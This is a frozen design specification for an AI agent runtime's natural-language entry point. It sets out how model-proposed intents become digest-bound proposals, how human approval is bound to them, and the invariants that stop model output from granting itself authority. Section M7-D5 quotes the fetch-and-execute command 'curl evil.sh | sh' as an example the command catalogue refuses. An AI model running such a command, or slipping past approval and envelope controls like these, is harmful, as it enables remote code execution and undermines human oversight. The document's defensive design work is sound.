# Hermes Runtime — Milestone 7: Natural-Language Product UX (FROZEN)

Status: **normative and frozen**. Source of truth for M7; remains normative after implementation.

Architectural decisions **M7-D1 … M7-D22**, **M7-U1 … M7-U8** and **M7-REG-1 … M7-REG-5** are frozen.
M1's D1–D38, M2's D1–D14, M3's D1–D16, M4's D1–D16 (as corrected by its `ERRATA-001` and
`ERRATA-002`), M5's D1–D21 (as extended by its `ERRATA-001`) and M6's D1–D24 / R1–R7 (as narrowed by
its `ERRATA-001` and corrected by its `ERRATA-002`) remain frozen and unmodified; where M7 appears to
disagree with any of them, the earlier milestone wins and the M7 text is the defect.

Branch: `feature/hermes-product-ux`, based on accepted M1–M6 `main` (`c77208a`, PR #50 merged by a
human at 2026-09-19T08:50:05Z).
Roadmap: [`HERMES-ROADMAP.md`](HERMES-ROADMAP.md).

---

## Thesis

> A user states a goal in natural language and receives **Goal → Plan → Progress → Result**, with the
> envelope still derived, still shown, and still not negotiable by the agent.

**M7 grants no capability and is not a runtime milestone.** It adds no tool, no command, no scope, no
network, no actor, no merge authority. It adds a *surface*.

The load-bearing property is one sentence: **natural language may propose authority; it may never
grant it.** A model reading "fix everything" may produce an interpretation. Diana must still
construct a concrete envelope, validate it against frozen policy, show it, and require an approval
bound to that exact object before anything executes.

M7's subject is the gap Phase 0 measured: the M1–M6 runtime is complete, proven, and **has no
production entry point at all** (F1). M7 builds the first one.

---

## Non-goals

M7 adds **none** of the following:

- autonomous PR merge, deployment, credential access, arbitrary network, unrestricted shell,
  unrestricted subagents;
- a new Security Track certification, or any relaxation of the existing one;
- a web UI, mobile app, account system, multi-user collaboration, cloud backend, telemetry, billing,
  generic chat history, or a workflow marketplace;
- a second source of truth for plan, progress or result;
- any widening of the M4/M6 envelope;
- deletion of any existing slash command (M7-D19).

M7 is not "build a SaaS." It is the smallest natural-language product layer over an accepted runtime.

---

## Phase 0 — empirical findings

Measured against the real repository at `c77208a` by execution and by reading code, not from the
roadmap. Each finding names how it was obtained so it can be re-derived.

| # | Finding |
|---|---|
| **F1** | **The M1–M6 runtime has ZERO production entry points.** Grepping every caller of `unattended.approve`, `actors.approve`, `actors.execute`, `unattended.execute` and `advisory.run.execute` while excluding `test-m*`/`test_m*` files returns **one** hit — `actors.approve` calling `unattended.approve` — and nothing else. Every milestone's runtime is reachable only from its own acceptance suite. M7 is therefore not a wrapper around an existing product path; it is the **first** entry point the runtime has ever had. |
| **F2** | **The real user surface is six prose slash commands, and only four are installed.** `install.sh` copies `fix.md`, `review.md`, `ship.md` and `hooks/cost-report.md` into a consumer project's `.claude/commands/`. `diana-ship.md`, `orchestrate.md` and `loop-audit.md` are **central-only** and travel with no install. The portable product surface and this repository's surface are different sets. |
| **F3** | **The most capable workflow is a 13-step manual protocol.** `/diana-ship` is steps 0–12 plus a 6a–8a two-actor variant, executed by a live Claude Code session. To use it a person must know: repository-state validation, canonical-memory consultation, goal normalisation, Definition-of-Done authoring, risk classification, AO precheck, AO spawn, attended tool-call approval, reviewer prompt construction, read-only reviewer rules, integration, preflight, Playwright applicability, Diana Gate and PR mechanics. |
| **F4** | **Only two of six slash commands invoke a deterministic Diana component.** `/diana-ship` reaches `diana/adapters/ao.py` and `diana/ship/ship.py`; `/review` reaches `diana/playwright/browser_applicable.py`. `fix`, `ship`, `orchestrate` and `loop-audit` reference none — they are prose protocols whose entire semantics live in the model reading them. |
| **F5** | **A deterministic natural-language entry already exists, and it is not a model call.** `advisory/run.py route()` maps a request to a certified workflow by a keyword rule: a subject set (`security, vulnerability, vulnerabilities, xss, insecure`) intersected with an action set (`check, review, audit, inspect, assess, scan`), vetoed by a disqualifying set (`fix, patch, remediate, repair, refactor, deploy, release, merge`) so a "fix this" can never quietly become a "look at this". It routes exactly **one** class and returns `None` otherwise, which blocks. This is M7's precedent and its scaling problem. |
| **F6** | **Approval and run-creation are the same act, and no proposal state exists.** `unattended.approve()` builds the contract and, in one call, persists `contract.json`, `run-policy.json`, `work-items.json` and `journal.json` under `~/.diana/runs/<run_id>/`. There is no object that is concrete, inspectable and *not yet a run* — nothing a user could be shown and could approve before durable state exists. **This is the single missing object for M7.** |
| **F7** | **The goal text is already structurally non-authoritative.** `contract.build()` records `task` with the in-code comment "Recorded for provenance and EXPLICITLY non-enforcing (D16): nothing reads it to make a decision, so it cannot become load-bearing later by accident." Natural language is therefore already incapable of granting authority, and M7's job is to keep it that way while making it *useful*. |
| **F8** | **Plan, Progress and Result are all derivable from existing Diana-owned state; none needs a new authoritative object.** Plan ← `work-items.json` (digest-bound `{id, task, depends_on}` DAG) plus the contract's `capability_envelope`. Progress ← `journal.json` (`state`, `items{status, attempts, reason_code, detail}`, `attempts[{actor, state, reconciled, within_envelope, turn_error}]`, `cancellation`). Result ← `run-report.json`. |
| **F9** | **Blocked UX is already mostly built.** `report.build()` emits `blocked_items[]` carrying `what_was_attempted`, `refused_by`, `reason_code`, `detail`, `depends_on`, `envelope_at_the_time` and `human_decision_required`. Six of the seven questions M7's blocked view must answer are already answered by Diana-owned state. The seventh — *would granting it widen the approved envelope?* — is not. |
| **F10** | **No frontend code exists anywhere in the repository.** No `package.json`, no `.tsx`/`.jsx`/`.vue`/`.svelte`, no web assets outside `diana/playwright/fixtures/` and `diana/runtime_verify/fixtures/`, which are test inputs. Nothing in the repository justifies inventing a web UI, and M7 does not. |
| **F11** | **Actor identity is already presentable without new state.** Journal attempt entries carry `actor` (M6-D7) and `report._attempt_summary` surfaces it (M6-D4 with M5-D17). Builder → Reviewer transitions are derivable today. |
| **F12** | **Hermes session and Diana run are related only by a one-way environment stamp.** `DIANA_RUN_ID` marks *descendants* and never the setter (M5 F16). Diana stores no Hermes session id and Hermes learns no run id. There is no shared identifier a product layer could key a conversation to a run by — it must key by `run_id` itself. |
| **F13** | **The frozen replacement-set assertion binds M7 hard.** M6-E1-AC-1 computes modified non-docs files as `git diff --name-status <M6 freeze>` and asserts **set equality** with M6's four files. Measured on this branch: exactly `.gitignore`, `blocking.py`, `journal.py`, `report.py`, `unattended.py`. **Any non-docs file M7 modifies joins that set and breaks M6-E1-AC-1** — `diana/commands/*.md` included. M7 must be purely additive outside `docs/`, or freeze its own erratum. This is measured, not inferred. |
| **F14** | **Pre-M7 regression baseline on `c77208a`, before any M7 code:** M6 acceptance **175**/0 with 21 falsifiers; M6 lease **45**/0 with 5; M6 attack **26** repelled / 0 through; M6 review **19**/0 with 5; M6 third pass **38**/0 with 3; M5 **202**/0; M1 **470**/0 (9/9 suites, 13/13 criteria). Pre-existing Diana regression **26/26** suites green, enumerated with `find` rather than a one-level glob (the under-count corrected during M6's final review). |

### What F1, F6, F8 and F13 together determine

F1 says there is nothing to wrap — M7 must *create* the entry point rather than decorate one. F8 says
almost everything the product needs to display already exists as Diana-owned durable state, so the
surface should be a **projection**, not a database. F6 names the one genuinely missing object: a
concrete, inspectable, not-yet-a-run thing for a person to approve. F13 says M7 may add files and may
not edit them.

So M7 is: **one new additive product package, one new pre-authority object (the Proposal), and no
change to anything that already exists.**

---

## Current UX inventory, classified

Per the Phase 0 requirement, every current surface is classified. **Nothing is deleted by M7.**

| Surface | Kind | Classification |
|---|---|---|
| `/diana-ship` (13-step protocol) | prose + `ship.py` + `ao.py` | **legacy but still required** — the only end-to-end pipeline; its goal→scope portion is M7's migration candidate (M7-D20) |
| `/fix` | prose protocol | **expert/debug shim** — retained |
| `/review` | prose + `browser_applicable.py` | **legacy but still required** — retained unchanged |
| `/ship` | prose protocol | **expert/debug shim** — retained |
| `/orchestrate` | prose protocol (LOOP.md/STATE.md/BUDGET.md) | **legacy but still required** — retained, not central-installed |
| `/loop-audit` | prose protocol | **expert/debug shim** — retained |
| `ao.py` (`check/spawn/status/stop`) | CLI | **legacy but still required**; AO runtime absent on this host (M6 F1) |
| `ship.py` (10 subcommands) | CLI | **legacy but still required** — byte-frozen by M2-REG-2 |
| `diana-gate.py`, `run-security-gate.py`, CI adapters | CLI | **normal product path** (CI), untouched |
| `preflight.py`, `reduce_for_gate.py`, `browser_applicable.py`, `repo_profile.py` | CLI | **expert/debug + CI**, untouched |
| `advisory/run.py route()/execute()` | library | **dead as a product path** (F1) — no production caller; it is M7's routing precedent |
| `unattended.approve/execute`, `actors.approve/execute` | library | **dead as a product path** (F1) — M7 gives them their first caller |
| `journal.read`, `report.build`, `unattended.read_result` | library | **expert/debug inspectors** — M7's Progress/Result read through them |
| security adapters/verifiers, coverage matrix, evidence model | CLI | **normal product path** (Security Track), untouched |

---

## The chosen product surface

**M7-D1 — The product surface is a Diana-owned CLI plus one additive natural-language command. No
TUI, no web UI, no frontend.** F10 measured that no frontend code exists; inventing one would be a
product the repository has not earned and a second place for authority to be described. F1 measured
that the runtime has no entry point, so the smallest thing that closes the gap is the entry point
itself. The CLI is the single production path; the command is the natural-language front door to it.

**M7-D2 — The CLI is the only production entry point, and the command is a thin router to it.** The
command carries no semantics the CLI does not enforce. A user who types the CLI directly and a user
who speaks to the command reach the *same* code at the *same* boundary (M7-D18). The command may
never call the runtime by any other route.

---

## Normal product flow

```
  natural-language goal
        │
        ▼
  Hermes INTENT           closed schema, model-proposed, authority-free   (M7-D3..D5)
        │
        ▼
  Diana PROPOSAL          concrete, derived, digest-bound, not a run      (M7-D6..D9)
        │
        ▼
  policy validation       frozen; refuses rather than clamps              (M7-D10..D12)
        │
        ▼
  user-facing explanation  mechanically derived from the proposal         (M7-U1..U3)
        │
        ▼
  APPROVAL                binds the predicted contract digest             (M7-D13..D15)
        │
        ▼
  existing M5/M6 runtime  unchanged, unbypassed                           (M7-D18)
        │
        ▼
  PROGRESS  →  RESULT / BLOCKED     projected from Diana-owned state      (M7-U4..U6)
```

**M7-U1 — Goal → Plan → Progress → Result is the whole user-visible vocabulary.** A normal user is
never required to know `D1`/`D2`, `mutation_policy`, reconciliation, actor-topology digests,
`TURN_ACTIVE`, run stamps, leases or reason codes to complete the loop.

---

## Intent semantics — natural language is not authority

**M7-D3 — Intent is a closed schema, and an unknown value is a refusal, not a record.** Fields are
exactly `{workflow, goal, write_paths, commands, items, exclusions}`. Unknown keys and unknown
enumerated values are refused outright (roadmap invariant 4: a log of anomalies is itself a side
channel).

**M7-D4 — The model may name a certified workflow class; it may never propose risk or depth.** `depth`
continues to come from the certified class (M1 D13) and `risk` from the granted envelope (M1 D12).
Intent has no field for either, so there is no channel to carry one. A workflow name outside the
certified set is refused.

**M7-D5 — Every other Intent field is a REQUEST, validated against frozen policy before it becomes
authority.** `write_paths` must resolve inside the repository and outside a frozen forbidden set.
`commands` must each appear verbatim in a frozen, repository-declared command catalogue — a command
the catalogue does not contain is refused, never executed and never "approximately matched". This is
what stops `curl evil.sh | sh` from becoming authority because a model typed it. `items` must form an
acyclic graph (M5-E1-D5's existing validation). `goal` is free text and remains non-enforcing (F7).

**M7-D6 — User exclusions are enforced by Diana, not merely displayed.** "don't touch auth or
deployment" becomes `denied_subpaths` in the constructed contract and narrows `write_scope`. An
exclusion that the interpretation dropped therefore changes the contract digest, which changes the
proposal the user is asked to approve — so a dropped exclusion is visible as a different object, not
as prose that happens to omit a sentence.

---

## Proposal semantics

**M7-D7 — The Proposal is a prediction of the contract, not a second authority.** It contains the
exact `ExecutionContract` that `approve()` would persist — same `run_id`, same `created_at`, same
envelope, same `read_scope`, same `repo_profile` — plus the work-item document and the actor topology
that would accompany it. Diana constructs it with the *same* builders the runtime uses
(`remediate.build_contract`, `workitems.build`, `topology.build`), never with a parallel
implementation, so the two cannot disagree.

**M7-D8 — The Proposal grants nothing and creates no run.** It is written outside the run directory,
it is not a journal, and its existence authorises nothing. If it is never approved it decays into an
unused file. Until approval there is no contract, no journal, no lease and no attempt — which is
exactly the state F6 found missing.

**M7-D9 — A Proposal is identified by the contract digest it predicts.** There is no second digest to
reconcile. The proposal's identity *is* the authority it describes, so "approve this proposal" and
"approve this contract" are the same statement.

**M7-D10 — Ambiguity produces NO proposal.** When intent cannot be resolved to exactly one certified
workflow and one concrete envelope, Diana returns a needs-clarification state naming precisely what is
undetermined. It never proposes the union of the readings, never picks the broader one, and never
proposes "everything the user might have meant". Widening to cover ambiguity is the exact failure
mode a product layer invites, and it is refused by construction.

**M7-D11 — Requested authority exceeding policy produces a refusal with its reason, not a narrowed
proposal.** Diana does not silently clamp a request down to what is permitted: a user who asked for
something outside policy is told which part was outside it. A clamped proposal is a proposal the user
did not make, and approving it would be approving a misunderstanding. (This mirrors M6-D13's
refuse-never-clamp rule for projections.)

**M7-D12 — A Proposal is invalidated by any change to what it predicts.** Because the proposal carries
the full contract including `target.git_commit` and `dirty`, a target that moves between proposal and
approval yields a different digest and the approval is refused. Target freshness is therefore part of
approval binding for free, with no new mechanism, and it composes with M5-D11's resume-time freshness
check rather than duplicating it.

---

## Approval semantics

**M7-D13 — Approval binds the predicted contract digest, and nothing else counts as approval.**
Approving means presenting that digest back. Conversational assent — "yeah sure", "do it", "go ahead"
— is **not** an approval and cannot become one: the approval path takes a digest argument and has no
free-text branch. A model cannot manufacture an approval by producing agreeable text, because
agreeable text is not the input type.

**M7-D14 — Approval is approval of the object, never of a paraphrase.** The explanation shown to the
user is derived from the proposal (M7-U2); the thing approved is the proposal. If the two ever
disagree, the proposal governs and the explanation is the defect.

**M7-D15 — What approval covers, stated exhaustively.** Approving a proposal digest approves exactly:
the workflow class and its derived depth; the derived risk; `allowed_tools`; `write_scope` including
`denied_subpaths`; `allowed_commands` and `command_policy`; `read_scope`; the work-item graph; the
actor topology; the run policy's attempt cap and deadline; and the target binding at that commit.
Nothing else. In particular **approval to start a bounded Diana run is not, and can never be
converted into, GitHub, merge, deployment or any other `HUMAN_ONLY` approval** (M7-D22).

---

## Plan, Progress and Result representation

**M7-U2 — Every user-facing statement about authority is mechanically derived from the contract.** The
Plan view renders `write_scope.allowed_roots` as "Can edit files under …", `allowed_commands` as "Can
run exactly …", and `denied_subpaths`/exclusions as "Cannot touch …". The mapping is a pure function
of the contract; there is no model-authored summary of authority anywhere in the normal path. A
hallucinated summary is not merely discouraged — it is unreachable, because the renderer takes the
contract and not a paraphrase.

**M7-U3 — Plan is projected from the work-item document, not stored again.** Per F8 the DAG already
exists, is digest-bound and is re-verified on every resume. The Plan view is a rendering of it.

**M7-U4 — Progress is projected from the journal, and nothing else.** Current item, completed items,
blocked items, active actor, attempt/retry state, reviewer status, cancellation and run state all come
from `journal.json` (F8, F11). M7 creates **no** progress database. A crash cannot produce a
conflicting UX state, because there is no second state to conflict: after a restart the view is
whatever the journal says, which is the same thing the runtime acts on.

**M7-U5 — Result is projected from the run report.** `outcome`, work completed, files changed,
verification performed, reviewer result, blocked decisions, authority actually used and residual
concerns all come from `run-report.json` (F8, F9).

**M7-U6 — A result view must separate SYSTEM FACT from MODEL EXPLANATION, visibly and
structurally.** Diana-derived fields are facts. Any model-written narrative is labelled as
explanation, is optional, and may never restate a fact in a way that contradicts one. Hermes may
summarise the evidence; it may not replace it, and the view must make which is which unambiguous to a
reader who is not looking for the distinction.

---

## Blocked and human-decision semantics

**M7-D16 — Blocked is a first-class product path, not an error screen.** A blocked view answers seven
questions: what was attempted; which Diana control refused it; why, by reason code; what exact human
decision is required; what the envelope permitted at that moment; **whether granting the decision
would widen the approved envelope**; and whether a new approval and run are required. Six are already
carried by `report.blocked_items` (F9); the widening answer is the one M7 adds, and it is computed by
comparing the decision against the approved envelope, never asserted by a model.

**M7-D17 — "Continue" can never widen authority.** There is no control, phrase, click or flag that
promotes a blocked run. If authority must widen, the only path is a **new proposal → new approval →
new contract and run**, exactly as M5-D12 requires for a drifted target. A product layer that could
promote an envelope in place would be the side door this milestone exists to refuse.

---

## Crash/resume and multi-actor UX

**M7-U7 — A crash and a resume are the same run in the user's view.** Same `run_id`, same Plan, same
approval, continued Progress — because all three are projections of durable state that survived
(M5). The product never shows a "new run" for a resumed one.

**M7-D18 — The product path and the expert path converge on the same authoritative controls, and
this is an acceptance criterion rather than an intention.** No product-specific fast path may bypass
contract validation, projection, role shape, freshness, journal, reconciliation, the run lease, actor
identity, budgets, reviewer semantics or blocked-state handling. The CLI calls `actors.approve` and
`actors.execute`; it does not reimplement them, and it has no alternate route.

**M7-U8 — Builder and Reviewer appear as work, not as architecture.** "fixing" and "reviewing" are
shown; `actor` identifiers, topology digests and projections belong to expert mode. **Model or
backend identity is not a user-facing concept at all** — it is not authority (M6-D21), and the turn
record that carries a backend's self-report is explicitly unvalidated (M6 F9). Expert mode may show
it, labelled non-authoritative.

---

## Expert and debug flow

**M7-D19 — No existing slash command is deleted, edited or renamed by M7.** F13 makes this
mechanically necessary and M7 makes it deliberate: expert controls are retained because deterministic
diagnostics are worth more than a UX metric. `/fix`, `/review`, `/ship`, `/orchestrate`, `/loop-audit`
and `/diana-ship` remain exactly as they are, and `ship.py`, `ao.py` and every CI adapter remain
byte-identical.

**Expert mode exposes** the contract, the journal, the work-item document, the actor topology, the
per-attempt reconciliation records, reason codes, the run lease holder and raw evidence — i.e. the
existing inspectors (`journal.read`, `report.build`, `unattended.read_result`), which M7 surfaces
rather than reinvents.

---

## Migration scope

**M7-D20 — M7 supersedes exactly one responsibility: the goal-to-approved-scope portion of
`/diana-ship` (its steps 2–5), for the certified bounded-remediation path only.** Those steps —
accept and normalise the goal, produce the Definition of Done, classify risk, precheck — are precisely
Goal → Proposal, and today they are prose executed by a model with no digest, no mechanical
derivation and no binding. M7 replaces that with a derived, digest-bound proposal and an approval that
binds it.

**Superseded for this certified path; not retired, not deleted, not modified.** `/diana-ship` stays
byte-identical and fully usable, as do `ship.py` and `ao.py`. The wording matters and is frozen: M7
may claim supersession, and may **not** claim retirement.

---

## Authority invariants

Restated so an implementation can be checked against them:

1. **No model output may create** a tool, a path, a command, higher risk, deeper execution, a new
   actor topology, network capability, merge authority or deployment authority.
2. **The goal text never enforces anything** (F7), and the product layer must not make it enforce
   anything.
3. **Every authority statement shown to a user is a pure function of the contract** (M7-U2).
4. **Approval is by digest** (M7-D13), and covers exactly M7-D15's list.
5. **Ambiguity narrows or refuses; it never widens** (M7-D10).
6. **Widening requires a new approval and a new run** (M7-D17).
7. **The product path and the expert path reach the same boundary** (M7-D18).

**M7-D21 — M7 does not solve M5-D20, and must not be read as solving it.** `REQUIRE_HUMAN` still has
no independently verifiable human-approval mechanism that automation cannot self-satisfy. M7 adds a
human approval step for *starting a bounded Diana run*; that is category A, and it is not category B.

**M7-D22 — The two approvals are different objects and never convert.** Approval A starts a bounded
run within an envelope Diana derived. Approval B is GitHub/merge/deployment/`HUMAN_ONLY` and is out
of M7's scope entirely. No amount of A composes into B.

---

## Regression invariants

**M7-REG-1** — The frozen M1, M2, M3, M4, M5 and M6 specifications and **all** errata
(`M4-ERRATA-001/002`, `M5-ERRATA-001`, `M6-ERRATA-001/002`) remain **byte-identical**.

**M7-REG-2** — **M7 is purely additive outside `docs/`.** Its permitted-replacement set of
pre-existing production files is **empty**. Per F13, modifying any non-docs file breaks M6-E1-AC-1;
M7 accepts that constraint rather than widening it. A future need to modify one requires an M7
erratum with its own justification, and the set is asserted by **equality** at implementation time.

**M7-REG-3** — Nothing is deleted or renamed, slash commands included (M7-D19).

**M7-REG-4** — All reusable M1–M6 behavioural acceptance tests remain green, at or above F14's
counts, with **all** M5 and M6 test files byte-unmodified.

**M7-REG-5** — The pre-existing Diana regression remains **26/26** suites green, enumerated with
`find` and never with a one-level glob (the defect M6's final review corrected).

---

## Acceptance criteria

M7 is accepted only if **all** hold, and **all** M1 (13), M2 (13), M3 (16), M4 (18), M5 (22 +
ERRATA-001) and M6 (24 + 12) criteria remain green. Every criterion is behavioural and falsifiable;
**each must have a falsifier that fails for the intended reason when its control is removed.** No
criterion may be satisfied by a model declining to misbehave, and **no assertion may be satisfied
merely by matching prose a model generated**.

| # | Criterion |
|---|---|
| **M7-AC-1** | A natural-language goal produces a **concrete bounded proposal**: a full contract, work-item document and actor topology, built by the same builders the runtime uses. |
| **M7-AC-2** | Every authority line shown to the user is **mechanically derived** from the contract: mutating the contract changes the rendering, and the renderer accepts no free text. |
| **M7-AC-3** | **No model text can grant authority.** An intent naming a tool, command, path, workflow, risk or depth outside frozen policy is refused with its own reason code — asserted per field, not by one over-broad check. |
| **M7-AC-4** | A command not in the frozen catalogue is refused even when an intent requests it verbatim, and never reaches `allowed_commands`. |
| **M7-AC-5** | **Approval is bound to the exact proposal.** Approving requires the predicted contract digest; a wrong digest, a stale digest and a digest for another proposal are each refused with distinct reason codes. |
| **M7-AC-6** | **Conversational assent is not approval**: "yes", "do it", "go ahead" and an approving model paraphrase all fail to start a run, proven by driving the real approval path. |
| **M7-AC-7** | **Changing the proposal after approval invalidates the approval**, including when only the target moved: the digest differs and the run is refused. |
| **M7-AC-8** | **Ambiguous intent produces no proposal**, names what is undetermined, and is proven **not** to produce the union or the broader reading. |
| **M7-AC-9** | Requested authority exceeding policy is **refused with the offending part named**, and no narrowed proposal is silently produced. |
| **M7-AC-10** | A user exclusion is **enforced in the contract** as a denied subpath, not merely displayed; dropping it changes the digest. |
| **M7-AC-11** | A bounded run starts **without any slash-command knowledge**, from a natural-language goal alone. |
| **M7-AC-12** | **Progress is projected from the journal**: with the journal as the only input the view is correct, and no parallel progress store exists in the run directory or elsewhere. |
| **M7-AC-13** | **Crash and resume preserve the same visible run** — same `run_id`, same plan, same approval — proven by a real uncatchable kill and a resume. |
| **M7-AC-14** | **Builder → Reviewer transitions display correctly**, derived from `attempts[].actor`, with no new state. |
| **M7-AC-15** | `COMPLETE`, `FAILED` and `BLOCKED` display correctly and distinguishably, and `BLOCKED` appears in no produced document (M1 D36). |
| **M7-AC-16** | **A blocked view answers all seven questions of M7-D16**, including whether granting the decision would widen the approved envelope — computed, not asserted. |
| **M7-AC-17** | **"Continue" cannot widen authority**: no input promotes a blocked run, and widening is proven to require a new proposal, a new approval and a new `run_id`. |
| **M7-AC-18** | **The product path and the expert path converge**: the same goal driven through both reaches the same contract digest and the same enforcement boundary, and the product path is proven to call `actors.approve`/`actors.execute` rather than reimplement them. |
| **M7-AC-19** | **No M1–M6 control is bypassed by the product path**: contract validation, projection, role shape, freshness, journal, reconciliation, run lease, actor identity, budgets, reviewer semantics and blocked handling each still fire, each proven by a falsifier. |
| **M7-AC-20** | `/diana-ship` steps 2–5 are **superseded for the certified path**: the same goal yields an approved scope through the product path, while `/diana-ship`, `ship.py` and `ao.py` remain **byte-identical** and their suites green. |
| **M7-AC-21** | **Every expert surface remains available**: all six slash commands, `ship.py`'s ten subcommands, `ao.py`'s four, and the CI adapters are byte-identical to `c77208a`. |
| **M7-AC-22** | Expert mode exposes contract, journal, actor, reconciliation, reason codes and raw evidence through the **existing** inspectors. |
| **M7-AC-23** | M7 grants no capability: `allowed_tools`, `write_scope` and `allowed_commands` for an approved run are identical to M4's envelope, `risk` derives `ELEVATED` and `depth` `D2` from the certified class, and M7 certifies **no** new workflow class. No count assertion appears anywhere in the suite (M5-D18). |
| **M7-AC-24** | M7 opens no pull request, performs no merge, makes no network call beyond the provider transport, and adds no subagent or ACP child. |
| **M7-AC-25** | **M7-REG-1…5 hold**, with the permitted-replacement set asserted by **equality** and proven **empty**, and 26/26 pre-existing suites green. |

---

## Unresolved decisions — deliberately left open

- **How routing scales past one workflow class.** M7 freezes that the model may *name* a certified
  class and that Diana validates it, but the certified set is still the two classes M1 and M4
  established. A third class needs its own certification, not a routing change.
- **Whether the Plan view should show the item DAG's edges** to a normal user, or only its order.
- **Whether a proposal should expire.** The digest already invalidates on target drift; whether a
  time-box adds anything is not yet measured.
- **Where the product layer lives for a consumer project.** F2 measured that the portable install set
  and this repository's set differ; which set the product command joins is an install question M7
  does not decide.

---

## Carried limitations — stated, not proven away

- **M5-D20 remains undischarged** (M7-D21), and M7 adding a human approval step is exactly what could
  be misread as discharging it.
- **Every M5 and M6 carried assumption carries forward unchanged**, including: per-PID ownership rests
  on `/proc`; quiescence bounds only processes Diana can see; reconciliation is detection and never
  prevention; the command allowlist is only as good as what Diana declares; a whole-record journal
  forgery (rewrite *and* re-digest) is undetected; the run lease is cooperative exclusion and **not
  containment**; and a hostile same-user process that unlinks and recreates the lease file is outside
  the inherited threat model.
- **The AO runtime is absent on this host** (M6 F1), so any AO-adjacent claim remains fixture-based.
- **A live provider is required** for the end-to-end criteria, and M2-AC-4's known provider
  sensitivity is unchanged — M6's final review measured M2 reporting 57 or 59 depending on whether
  the live turn exhausted its iteration budget.
- **This specification has not been independently audited.** M4, M5 and M6 each had defects found by a
  reviewer after a green self-audit; M6's own final round found five. M7 is frozen on the same terms
  and carries the same exposure.
